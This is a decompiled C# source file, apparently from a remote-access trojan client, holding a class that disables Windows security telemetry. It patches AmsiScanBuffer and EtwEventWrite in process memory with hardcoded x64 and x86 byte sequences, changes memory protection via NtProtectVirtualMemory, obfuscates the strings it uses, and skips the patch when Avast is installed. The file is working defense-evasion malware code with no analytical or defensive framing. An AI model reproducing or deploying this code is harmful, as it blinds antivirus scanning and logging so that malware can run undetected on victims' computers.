using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Client.Helper
{
	// Token: 0x02000005 RID: 5
	internal class AsmiAndETW
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00002A7C File Offset: 0x00000C7C
		private static void PatchAmsi(byte[] patch)
		{
			string text = EncryptString.Decode("amsi.dll");
			bool flag = true;
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (module.ModuleName == text)
				{
					AsmiAndETW.PatchMem(patch, text, EncryptString.Decode("AmsiScanBuffer"));
					flag = false;
				}
			}
			if (flag)
			{
				AsmiAndETW.AggresivAmsiActivate(patch, text);
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002B18 File Offset: 0x00000D18
		private static void AggresivAmsiActivate(byte[] patch, string dll)
		{
			byte[] array = new byte[new Random().Next(1, 100)];
			new Random().NextBytes(array);
			Assembly assembly = Assembly.Load(array);
			try
			{
				assembly.EntryPoint.Invoke(null, null);
			}
			catch
			{
			}
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (module.ModuleName == dll)
				{
					AsmiAndETW.PatchMem(patch, dll, EncryptString.Decode("AmsiScanBuffer"));
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002BE4 File Offset: 0x00000DE4
		private static void PatchETW(byte[] Patch)
		{
			AsmiAndETW.PatchMem(Patch, EncryptString.Decode("ntdll.dll"), EncryptString.Decode("EtwEventWrite"));
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002C00 File Offset: 0x00000E00
		private static void PatchMem(byte[] patch, string library, string function)
		{
			try
			{
				IntPtr processHandle = new IntPtr(-1);
				IntPtr exportAddress = DInvokeCore.GetExportAddress((from ProcessModule x in Process.GetCurrentProcess().Modules
				where library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)
				select x).FirstOrDefault<ProcessModule>().BaseAddress, function);
				IntPtr intPtr = new IntPtr(patch.Length);
				uint num = 0U;
				DllImport.NtProtectVirtualMemory(processHandle, ref exportAddress, ref intPtr, 64U, ref num);
				Marshal.Copy(patch, 0, exportAddress, patch.Length);
			}
			catch
			{
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002C94 File Offset: 0x00000E94
		public static void Bypass()
		{
			if (Config.AntiVirus.ToLower().Contains(EncryptString.Decode("avast")))
			{
				return;
			}
			try
			{
				if (IntPtr.Size != 4)
				{
					AsmiAndETW.PatchAmsi(AsmiAndETW.x64_am_si_patch);
					AsmiAndETW.PatchETW(AsmiAndETW.x64_etw_patch);
				}
				else
				{
					AsmiAndETW.PatchAmsi(AsmiAndETW.x86_am_si_patch);
					AsmiAndETW.PatchETW(AsmiAndETW.x86_etw_patch);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400001F RID: 31
		public static byte[] x64_etw_patch = new byte[]
		{
			72,
			51,
			192,
			195
		};

		// Token: 0x04000020 RID: 32
		public static byte[] x86_etw_patch = new byte[]
		{
			51,
			192,
			194,
			20,
			0
		};

		// Token: 0x04000021 RID: 33
		public static byte[] x64_am_si_patch = new byte[]
		{
			184,
			52,
			18,
			7,
			128,
			102,
			184,
			50,
			0,
			176,
			87,
			195
		};

		// Token: 0x04000022 RID: 34
		public static byte[] x86_am_si_patch = new byte[]
		{
			184,
			87,
			0,
			7,
			128,
			194,
			24,
			0
		};
	}
}
